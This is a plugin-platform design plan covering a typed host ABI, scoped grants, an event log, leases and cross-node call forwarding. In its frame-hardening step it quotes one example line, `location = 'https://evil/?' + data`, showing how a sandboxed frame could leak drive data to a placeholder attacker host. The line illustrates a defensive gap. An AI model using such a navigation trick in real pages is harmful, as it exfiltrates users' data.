# Host ABI: apps on a typed, real-time, multi-machine host

**Status:** Accepted direction (Joep, 2026-10-14). Step 0 done (#2258). The
first slice of step 1 runs on the server and from frames (below). Pre-v1: the ABI may break until it
is declared v1.

Goal, in Joep's words: the plugin interface should be "a type-safe, real-time,
decentralized, multi-machine Linux". Plugins are apps. Apps export typed
functions that other apps (and LLMs) can discover and call. Performance-critical
code can be Rust. The whole interface is machine-readable.

Background analysis (current interface, ~190 related issues, comparison with
atomic-plugins' "pieces" design): kept outside the repo, in the project's
shared files as `plugin-interface/analyse.md`. This file is the plan.

## What exists, and why it is not enough

Five extension kinds, each with its own host surface:

| Kind | Interface | Writes |
| --- | --- | --- |
| Built-in Rust class extenders | `lib/src/class_extender.rs` | direct |
| WASM class extenders | `atomic-plugin/wit` (`atomic:class-extender@0.1.0`) | `commit(json string)` |
| QuickJS `run` plugins | `plugin-runtime/wit` (`atomic:plugin-runtime@0.1.0`) | returns intents |
| View / drive-app frames | `browser/plugin` `store` + `view-client.js` | `apply(intents)` |
| Integrations | integration proxy via `store.proxy` | remote |

They share only `get` and a property/value `query`. Everything crosses the
WASM boundary as JSON strings. Permissions are six coarse capabilities
(`server/src/plugins/manifest.rs`). Events are split over query triggers, cron,
afterCommit hooks and three unrelated webhook proposals. Plugin state
(schedules, triggers, kv, secrets) lives in private trees, not resources.

## Principles

1. **One ABI, described once.** A single interface definition (WIT, or a schema
   that generates WIT) is the source for Rust bindings, TS types, the frame
   client, `openapi.yml` and the MCP tool list. WIT is an IDL, not a runtime:
   JS in the browser keeps calling the host over `postMessage`, with no WASM
   hop. Only Rust components cross the WASM boundary.
2. **The schema is the type system.** An Atomic class becomes a WIT record;
   properties stay content-addressed (`atomic:prop:`). Generated Rust and TS
   types use the same property IDs.
3. **Apps export, the host routes.** An app exports interfaces
   (`atomic:tasks/manage@1`). Callers ask for an interface, not an app; the host
   resolves the installed provider, checks rights, audits, and may forward the
   call to another node. Apps never talk to each other directly.
4. **Capabilities are scoped handles.** Grants are `(scope, rights)` where scope
   is a drive, subtree, class, table or query. A callee runs with its own grant
   plus handles the caller passes explicitly, never the caller's full rights.
5. **Everything is a resource.** Exports, schedules, triggers, app state,
   connections, run logs and health are resources under the `Installation`.
   Secret values stay out of the graph; references to them do not.
6. **Same code, any node.** Placement (browser, desktop, server) is a host
   decision from trigger, grant and availability. Background work holds a
   lease so it never runs on two nodes at once.
7. **A small kernel; everything else is a built-in app** (Joep, 2026-10-14).
   The kernel is `get`, `query`, `subscribe`, `apply`, `events` and rights
   checks: everything else, including app rights, is built on it, so it cannot
   go through itself. It is still described as an interface
   (`atomic:host/store@1`), discoverable and typed like any export. Host
   services become built-in apps with ordinary exports, replaceable like
   userspace services behind D-Bus: `atomic:ui/dialogs@1` (confirm, toast,
   menu, share), `atomic:ui/pickers@1` (pick resource, pick file),
   `atomic:ui/navigation@1` (open resource, open external). Theme is data, not
   a function: a resource apps subscribe to, managed by a theme app.
8. **Three tiers, one interface.** Scripts (JS/TS, QuickJS or browser worker),
   components (Rust or any language to `wasm32-wasip2`, sandboxed, fuel), and
   modules (native Rust in the server, operator-installed only).

## Steps

### 0. Close the frame network hole

- [x] Frame CSPs (`server/src/handlers/plugin_ui.rs`) get `connect-src 'none'`
      and both carry a `sandbox` directive. Today `connect-src *` lets a view
      that may read drive data send it to any host.
- [x] Integration-proxy requests from frames go through the host (a
      `proxyFetch` host op restricted to the minted capability's origin)
      instead of a direct `fetch` from the frame.
- [ ] `img-src 'self' data: blob:` and `font-src 'self' data:`: a remote
      image or font URL can carry data in its query string.
- Known gap: a frame can navigate itself (`location = 'https://evil/?' +
  data`). No CSP directive blocks a document navigating itself
  (`navigate-to` was dropped from CSP). Closing it needs the frame to hold no
  data worth stealing without the host (later steps), or a host-side
  watchdog that tears down a frame whose document changed.

### 1. One host ABI (pre-v1)

- [ ] Write the ABI: read (`get`, `get-many`, `query` with filters and
      completeness, `subscribe`), write (`apply(intents)`, `undo`), events
      (`events(cursor)`), outside world (`fetch(operation)`, `invoke-action`),
      state (resources under the installation), and calls
      (`call(interface, function, args)`). Interaction is not a kernel op: it
      is `call` on the built-in `atomic:ui/*` apps (principle 7).
      *Slice built (2026-10-14):* `atomic-host/wit/host.wit`, implemented for
      world `sandboxed-app` in `server/src/plugins/host_abi/`: `get`,
      `get-many`, `query` (class, parent, `eq`/`lt`/`lte`/`gt`/`gte`/`contains`/
      `exists`, cursor, `complete`), `apply`, `subscribe`, `net.fetch`,
      `events.set-filters`/`next`/`ack`, `calls.providers`/`describe`/`call`. Still
      `unsupported` or missing: `search`, `undo`, the `ne` filter, subclass
      matching in `class`, `invoke-action`, state as resources, feeding
      `events` from triggers/cron, durable proposals, `handles`.
      Docs: `docs/src/plugins/host-abi.md`.
      *Review hold fixed (2026-10-15):* `/host/call` is v2-signed (method + body),
      needs read (and write for `write`/`external` exports) on the drive before
      anything loads, is rate limited, and caches release load failures for 5
      minutes; manifest `uses` bounds `calls.call`; frames send
      `allowEffects: ["read"]` (no approval UI yet); one entry call has a shared
      budget (64 calls, 16G fuel pool with give-back, 30 s deadline);
      `get-many` is capped at 100; app error codes outside the ABI become
      `internal`; `apply` refuses a `set` of `isA` to Installation/Plugin/Release.
      Open: `effect` is author-declared, so approval UI (step 2) must not trust
      it alone; the fuel pool is per entry call, not per drive or agent.
- [x] Typed records instead of JSON strings; batch operations. (`get-many`,
      multi-intent `apply`. `calls` arguments stay JSON by design.)
- [ ] Generate Rust bindings and TS types plus the frame client from it.
      *Rust done* (host: `wasmtime::component::bindgen!`; apps: `wit-bindgen`,
      see `plugin-examples/host-abi-*`). *TS: calls done*, hand-written rather
      than generated: `browser/plugin/src/hostAbi.ts` (`AppExport`, `Effect`,
      `HostError`, error codes; a test checks them against the Rust codes) and
      `store.callExport(interface, fn, args)` in `@tomic/plugin` (`store.call(op, args)` stays the transport), over a `call` frame
      op that the host sends as a signed `POST /host/call`. Not done: types for
      `store`/`net`/`events`, generating them with jco, `call` in packaged
      views (only drive-app frames), `describe`/`providers` from a frame.
- [ ] Port the three runtimes (class-extender WIT, plugin-runtime WIT, frame
      `store`) onto it. Legacy RPC, `plugin.json` and `/app-write` go once the
      catalog apps are ported; stored installations stay readable.
      *Mapping (2026-10-16).* Old function -> ABI function; "missing" is what
      one side lacks.

      QuickJS `run` (`plugin-runtime/wit`, `js_runtime.rs`, `ctx.*`):
      | old | ABI | note |
      | --- | --- | --- |
      | `fetch(json{method,url,...})` / `ctx.http` | `net.fetch` | old is URL-based, ABI names a manifest operation; kept as the alias (testdata plugins call it) |
      | `get-resource(subject)` / `ctx.read` | `store.get` | old returns JSON-AD, ABI a typed resource; alias kept (testdata plugins read `row[prop]`) |
      | `query(property, value)` / `ctx.query` | `store.query` (`eq`) | old returns subjects, drive-scoped; alias kept |
      | `invoke-action` / `ctx.integration` | none | integration actions; closest is `calls.call` on a connector app |
      | `run(source, input) -> verdict` | `app.on-event` / `invoke` | the verdict's intents are `store.intent`s; proposing is `store.apply` -> `proposed` |
      | missing in old, **built (JS)**: | `store.get`, `get-many`, `query`, `net.fetch`, `calls.providers/describe/call` | `host_abi/js.rs`, globals `store`, `net`, `calls` |
      | missing in old, not built | `store.apply` (`needs-approval`, intents are the verdict), `subscribe`, `undo`, `search`, `events` | |

      Class extender (`atomic:class-extender@0.1.0`, now world `server-module`):
      | old | ABI | note |
      | --- | --- | --- |
      | `get-resource(subject, agent?)` | `store.get` | **done.** ABI has no `agent` override: reads are caller ∩ Installation agent, and the module is both. The old host ignored `agent` too |
      | `query(property, value, agent?)` | `store.query` + `eq`, `with-resources` | **done**, same |
      | `get-plugin-agent()`, `get-config()` | `context.get` (new, `server-module` only) | **done.** The Installation, the agent and the config |
      | `commit(commit-json)` | `store.apply` | **done.** Raw signed commits are gone: intents are planned like every other write. `atomic-plugin`'s `commit(&CommitBuilder)` builds the intents (`push` reads the array first) |
      | `fetch(http-request)` | `net.fetch` | **done.** By operation id; no `wasi:http`, no sockets. A module may fetch `write` operations (it runs in the commit path, nobody approves) |
      | `class-url` | `hooks.classes` | kept as an export instead of the manifest: an operator's `global` module has no manifest, and `describe_package` learns a package's classes from it |
      | `on-resource-get(ctx)` | `hooks.on-get(resource, agent, query)` | **done.** Answer replaces the resource (only the changed properties are rebuilt). The request's query pairs go in as `query`; `get-answer.referenced` lists subjects the host reads (with the module's grant) and sends along |
      | `before-commit(ctx)` | `hooks.before-commit(commit-info, after)` | **done.** `list<problem>`: an `error` refuses. No `before` argument: the commit is not stored yet, so `store.get` is the state before |
      | `after-commit(ctx)` | `hooks.after-commit(commit-info, after)` | **done.** The `events` `commit` kind is still the long-term shape |

      Frame (`hostStore.ts` ops):
      | op | ABI | note |
      | --- | --- | --- |
      | `get`, `getMany` (100) | `store.get`, `get-many` (100) | |
      | `query` | `store.query` | frame's `parseViewQuery` fields differ |
      | `search` | `store.search` | unsupported on the host too |
      | `apply`, `undo` | `store.apply`, `undo` | frame has its own history |
      | `create`, `save`, `destroy` | `store.apply` (`create`/`set`+`remove`/`destroy`) | `refuseOutsideApp` is a frame-side scope; ABI needs step 2 grants |
      | `call` | `calls.call` | done (`callExport`) |
      | `subscribe`, `unsubscribe` | `store.subscribe`, `unsubscribe` | frame no-ops |
      | `proxyCapability`, `proxyFetch`, `proxyConnections` | `net.fetch` | integration proxy has no ABI function |
      | `app`, `data`, `context` | none | the Installation, table binding and current agent: a `context` call |

      *Built (slice 1, 2026-10-16): QuickJS `run` plugins.* The runtime has
      one new import, `abi(function, args)` by WIT name, and the globals
      `store`, `net`, `calls` (`plugin-runtime/src/lib.rs`). The host side,
      `host_abi::JsAbi` (`host_abi/js.rs`), builds an `AbiState` for the
      plugin's Installation per call and calls the same interface code as a
      component, so rights, `CallBudget`, `check_write` per hop, error codes
      and `manifest.uses` are the same code. Wired in `/plugin-run`, triggers
      and schedules. A run's budget allows `read` exports only (as a frame);
      `store.apply` is `needs-approval` (the verdict proposes). `uses` is
      allowed in world `extension` too.
      *Old names are shims (same slice).* `ctx.http`, `ctx.read`, `ctx.query`
      are JS in the prelude over `abi(...)`, with their old shapes: `http` is
      `net.fetch` in its URL form (`{method, url, ...}`, still
      `HostCore::fetch`; the operation-id form is the ABI's), `read` builds
      JSON-AD from `store.get`, `query` pages `store.query` (`eq`, string
      value). `fetch`, `get-resource` and `query` are gone from the runtime
      WIT, `PluginHost`, `StoreHost` and the test fakes. `ctx.integration`
      stays on `invoke-action` (no ABI function). A bare `StoreHost` answers
      `abi` with a throwaway registry (`calls.*` reloads apps); `JsAbi` shares
      one. `atomic-plugins` calls none of the removed imports directly; all
      its plugins use `ctx.*`.
      *Next:* widen a run's budget once approval exists; move the URL form's
      checks onto operation ids and drop it.
      *Built (slice 2, 2026-10-16): class extenders as `server-module`.*
      `host_abi/module.rs` (`ServerModule`) loads a component of world
      `server-module` and registers its hooks with `lib`'s `ClassExtender`.
      Each hook builds an `AbiState` for the module's Installation
      (`build_host`, so `HostCore::for_run`), caller and Installation both the
      module's own agent, and links the same `store`, `net` and `calls`
      implementations as an app (`module_bindings` maps those interfaces onto
      the `sandboxed-app` bindings). There is no rights code of its own.
      `wasm.rs` keeps only the zip, the files and the registration; the old
      `WasmPlugin`, `PluginHostState`, the class-extender `Host` impl,
      `HostCore::{for_class_extender, commit, plugin_agent}`, `FetchPolicy::Origins`,
      `egress::refuse_url`, `wasi-http` and `server/wit/class-extender.wit` are
      deleted. `atomic-plugin` is regenerated from `atomic-host/wit` (same
      `ClassExtender` trait, now with `on_resource_get` defaulting to `None`).
      A legacy `PluginMeta` agent becomes the Installation's app agent when the
      module loads (`bind_installation_agent`), so `installation::resolve` finds
      one identity. Fixtures rebuilt: `browser/e2e/tests/fixtures/test-plugin.zip`
      (README procedure, ui included) and the new `testdata/host-abi/module.wasm`.
      What took the six steps:
      - [x] (1) `after-commit` and `commit-info` (`commit-json`, `is-new`) in `hooks`
      - [x] (2) writes: `store.apply`, no raw commit
      - [x] (3) `get-config` and `get-plugin-agent` as `context.get`
      - [x] (4) `server-module` linker (`module.rs`) and hooks from `wasm.rs`'s
        registration in place of `bindings::ClassExtender`
      - [ ] (5) operator-only install: world `server-extension` still means "a
        `server-module` component", and who may install it is unchanged (not
        a new check)
      - [x] (6) rebuild `test-plugin`, `random-folder-extender` (its Discord
        webhook is dropped: a user-configured URL is not an operation);
        atomic-plugins has no extender crates and no `atomic-plugin` users
      A module shares the node's `HostAbiRegistry` (`appstate.host_abi`,
      threaded through the Installation hook and the loader), so `calls.call`
      from a hook finds the apps of its drive. A server extension may declare
      `uses` now; a module that declares some loads the drive's apps before
      each hook.
      *Next:* an entry deadline for hooks (only fuel and memory bound them),
      the `storage` folder under the ABI's own name, and move `events`
      `commit` in as the after-commit.
- [ ] Conformance suite: run published catalog releases against each host
      build (regression test until v1, a promise after).

### 2. Scoped grants

- [x] Rights as `(scope, rights)` grants enforced in the one place grants are
      intersected today (`host_core.rs`'s `Grant`), for every runtime.
      *Done as the smallest design:* three ordinary properties on the
      Installation (`readScope`, `writeScope`: subtree roots; `callScope`:
      interface names), parsed once by `installation::Scopes`, checked by
      `hierarchy::check_read` / `check_write` first and then by the scope.
      Activation (`plugin.rs`, `scope_roots` / `grant_scopes`) validates every
      root (exists, in the drive, writable by the installer) and puts the
      app's agent on it, replacing the `full-drive-access` special case in
      `create_plugin_meta`, which is now the widest scope (the drive).
      Unset means unlimited (older Installations); `proposed` is the outcome
      of an out-of-scope write, as for any write the agent may not make.
      *Not done:* class scopes (`readScope` takes subtrees, not "every Task");
      the other capabilities (`storage`, `extended-*`, `custom-view`) are not
      scopes yet and stay in `grants`; removing the agent from old roots when a
      scope shrinks (the host ignores them); per-call `handle`s still ignored;
      the manifest does not declare scopes yet (step 4), so the installer picks
      them freely within their own rights.
- [ ] Consent dialog shows scopes in plain language.
- [ ] Covers #1740, #1741, #1849 and most of #2235 with one mechanism.

### 3. One event stream

- [ ] Durable, cursor-based stream: query edges, commits on a class, cron,
      field timers, inbound webhooks, "connection needed", tombstones (#1850).
      *Done:* one ordered log per drive (`lib/src/db/drive_events.rs`), a row
      per applied commit written in the commit's own batch, so a crash never
      separates change and event. Apps subscribe through `events.set-filters`
      (class, subtree, property), read from a cursor with `next` and `ack`;
      filters and checkpoint are stored, so a restart replays what was missed
      exactly once. Delivery checks the caller's and the Installation agent's
      read rights and `readScope` per event; tombstones (destroy events) exist.
      Replaces the in-memory per-installation queue.
      *Done too:* `triggers.rs` consumes the log. Query edges are not a second
      producer: `apply_transaction` already sees the `QueryMembers` writes, so
      the commit's own event row lists the edges of watched trigger queries
      (`DriveEvent.edges`). Each trigger has a cursor (`trigger/<plugin>`) and
      one saved in-flight record; the old `plugin-event/v1` queue, its dedup
      window and the id-keyed check are gone. Kept: the self-echo skip and the
      30-per-minute rate limit, which the stream does not cover. Old
      `plugin-event/v1` rows are not migrated.
      *Not done:* the producers other than commits (cron, field timers,
      webhooks, connection-needed). Module `after-commit` stays synchronous: it
      is handed the resource as the commit left it, runs under the commit's
      locks-released window and its failures are logged against that call, none
      of which an event row carries. The WS commit notifications still run on
      their own path. The host does not call `on-event`; apps
      pull. Event rows hold no per-subscriber state, so no fan-out cost.
- [ ] Untriggered verdicts become stored proposals, not discarded ones.
- [ ] Replace the three webhook proposals (#77, #976, atomic-plugins#369).

### 4. Schemas as the shared format

- [ ] Enforce datatype, `allowsOnly` and class constraints on incoming commits
      (#2160), without blocking sync.
- [ ] One home for shared vocabularies: the embedded `.../v1/` vocabularies
      (#2247); move atomic-plugins' `ontology-kit` classes there.
- [ ] Releases declare the classes they read, write and extend; the host binds
      at install. The scheduler stops looking up vocabulary by shortname
      (`drive_terms`).
      *Started (smallest slice):* a manifest `schema` has `vocabularies`
      (fixed shared ontologies, referenced, never copied) and one inline
      `ontology` (the `ensureOntology` plan). `plugin.rs`'s `activate` makes the
      inline one real through `ensure_ontology` (`plugins/app_schema.rs`), so a
      second app or a reinstall reuses it, and refuses a missing vocabulary. An
      export field's `property` points into either; `check_values` validates
      call arguments and results with `Value::new` for that Property's datatype
      and its `allowsOnly`, after the JSON shape check. Not a second schema
      engine.
      *Not done:* the binding is not stored as a resource; class scopes (step
      2) and `uses`/`extends` by class; nested or array fields; a class as a
      field type; the scheduler still uses `drive_terms`; moving
      `ontology-kit` classes into the vocabularies; `@tomic/lib` has no
      matching type for the manifest `schema` field.
- [ ] Views match subclasses of the class they declare, so drive classes that
      extend a shared class get its views (to settle with atomic-plugins, whose
      views match the exact class).
- [ ] The compat diff (#2239) runs in `ensureOntology`, the ontology editor and
      on release publish, not only in the CLI. Retire `ensureSchema`.

### 5. Exports, calls and introspection

- [ ] Every app export (function, stream, view) is a resource under its
      `Release`: name, description, input and output schema, effect
      (`read` / `write` / `external`).
      *Started:* a `sandboxed-app` manifest declares `exports` (function only,
      bounded JSON Schema subset) and `calls.describe` / `POST /host/call`
      serve them. They are not resources yet, and MCP tools, Cmd+K and docs are
      not derived from them.
      *Progress (step 5, MCP):* every `read` / `write` export of an installed
      app is also an MCP tool on `/mcp` (`server/src/mcp/exports.rs`), named
      `<interface>__<function>`, called through the same rights path as
      `/host/call` (`host_abi::call_for_agent`). `external` and `interactive`
      are not offered. Cmd+K, in-app AI tools, bindings and docs do not derive
      from exports yet, and the exports are still not resources.
- [ ] MCP tools, Cmd+K actions, in-app AI tools, bindings and docs are all
      derived from those resources (today only manifest `actions` become MCP
      tools in `server/src/plugins/actions.rs`'s `list`, an in-app listing).
- [ ] The host ABI itself is described the same way.

### 6. Placement and multiple machines

- [x] Leases for background work, as resources.
      *Done (first slice):* `server/src/plugins/lease.rs`, vocabulary in
      `lib/defaults/plugins.json` (`Lease`, `leaseOf`, `leaseHolder`,
      `leaseExpiresAt`, `leaseGeneration`, `previousLease`). A lease is a child
      of the Installation, created with a genesis commit and renewed by its
      holder only. `triggers::drain` and `scheduler::run_due` ask
      `Leases::holds` before running anything; a non-holder leaves edges
      pending. TTL 60 s, renewed with 30 s left; an expired head is taken over
      by a new lease naming it (`previousLease`, generation + 1).
      *Convergence:* the head is the maximum of the synced leases under
      `(generation desc, holder node id asc, subject asc)`. All three are
      immutable after creation and the order is total, so the head is a
      function of the *set* of leases: nodes with the same set agree, and sets
      only grow. Concurrent takeovers share a generation, so the lowest node id
      wins. This replaces the "reject as a causality conflict" idea above: the
      takeover needs no rejection because losing is decided by the rule, and
      a Loro LWW write is never what picks the holder (expiry only decides
      whether the head *may* be replaced). Overlap while two contenders have
      not yet synced is the sync latency; a holder that lost keeps running at
      most until its cached verdict ends (at most 30 s, the renewal point).
      *Delivery across a takeover: at-least-once.* Cursors and in-flight
      records stay in each node's db. A standby does not move its cursor, so
      the new holder repeats edges the old holder handled since the standby
      last held the lease (bounded by the 7-day retention). Nothing is
      skipped: each node writes an event row for every commit it applies.
      *Single node:* no Iroh node id, or no known peer for the drive and no
      lease synced, writes no lease; the verdict is cached for 10 s, so the
      hot path is a map lookup.
      *Not done:* a watermark in the lease so a new holder skips what the old
      one finished (needs a commit-level identity shared across nodes; event
      `seq` and `at_ms` are per node, so a time cutoff could lose edges);
      trigger and schedule registrations themselves are node-local rows, not
      synced, so a standby only takes over triggers it has; `events.next`
      consumers and the future cron/field-timer producers are not leased;
      no validation of a takeover by other nodes (a signer with write rights
      could take over early, or lie about time); clocks are assumed to agree
      to within seconds; not tested over a real Iroh sync, the tests carry
      the lease commits between dbs by hand.
- [x] Forward a call to a node that can run it, same signature.
      *Done (first slice):* `call_export` finds no provider and a known Iroh
      peer syncs the drive: the call goes out as a `CALL` frame
      (`lib/src/sync/call.rs`, `docs/src/websockets.md`), the answer is a
      `CALL_RESULT`. Server side in `host_abi/forward.rs`: `CallForwarder`
      (Iroh, over the known peers whose `drives` list the drive), `ServedCalls`
      (the `CallHandler` the lib calls). *Auth:* the stream's AUTH is the
      forwarding node's agent, bound to `drive#nodeId` like a sync. The caller's
      own proof is not forwarded: it is signed for the first node (or is an MCP
      token), and replaying it at another node is what the node binding exists
      to stop. So the node vouches for the caller named in the frame, and the
      serving node needs *both* to pass: `call_for_agent` for the caller, and
      `check_read` / `check_write` on the drive for the vouching node's agent
      (`CallBudget::vouched_by`, checked at each hop that writes). A node can
      therefore only vouch for what it could do itself; a malicious paired node
      can still name any caller whose rights it holds too, for the drive-level
      checks. App reads inside the call are bounded by the named caller and the
      Installation's agent only, not by the vouching node. *Budget:* calls,
      fuel, effects and the secrets flag travel; the server caps them at its own
      limits and never widens; the sender reserves its whole pool and gets back
      `callsLeft` / `fuelLeft`. Depth counts across the hop; a served call is not
      forwarded again (no loops). Tested in `host_abi/forward_tests.rs` (two
      nodes in one process, a real Iroh connection) and
      `lib/src/sync/call.rs`.
      *Not done:* MCP tools are listed from local exports only, so a forwarded
      export is reachable over `/host/call` but not offered by MCP; peers are
      tried in known-peers order with no health or load; a drive this node
      never synced is not forwarded; the call is synchronous (no async/queued
      form, so a call over 30 s is stopped); a forwarded call to a peer without
      the `CALL` frame times out instead of failing fast (no capability
      advertised yet); the forward is not tested across two OS processes.
- [~] Apps needing a secret run on the node that holds it.
      *Minimal:* an app found locally whose declared secrets this node does not
      hold (`forward::holds_secrets`, name and origin) is forwarded too, and a
      peer's `not-found` falls back to running here. Secrets are never sent or
      synced. Left: knowing *which* peer holds them (today every known peer of
      the drive is tried in order, and each re-runs the check on its own
      secrets), and an explicit "run only where the secret is" policy for
      background work, which belongs to the lease above.

### 7. Proof

- [ ] One Rust component (for example the Money statement parser) called by a
      JS app through a typed interface, in the browser and on the server.
- [x] One built-in extender (chatroom) rewritten as a module on the
      ABI, as a second conformance test next to the Kanban plugin. It is a
      native module: `NativeHooks` (the `hooks` interface as a Rust trait) behind
      `ServerModule::native`, registered and answered like a component, calling
      `store.query` through the same `AbiState` imports and `Grant`. It differs
      from an installed app in loading and in one grant: with no Installation it
      reads as the reader, not as the public. Form was not taken: its summary is
      5000 lines of host form logic (`forms::build_form_definition`), not a
      read of the store. Left: Form and the other built-in extenders
      (`files`, `installation`, `conversations`), and without the
      `wasm-plugins` feature the chat room extender is not registered, since
      the ABI host lives behind it.

## Not now

- New per-wish frame ops (#1734, #1735, #1736, #1739): fold into the built-in
  `atomic:ui/*` apps and `call` instead.
- Growing plugin routes (#2176) into websockets and sidecars (#1722, #1723)
  before steps 1 and 2; otherwise routes get their own rights model and ABI.

## Open

- Whether kernel features beyond the step 7 proof should use the ABI.
- Settling with atomic-plugins (Michiel): subclass matching, where shared
  classes live, and how "pieces" (views, integrations, lenses) map onto exports.
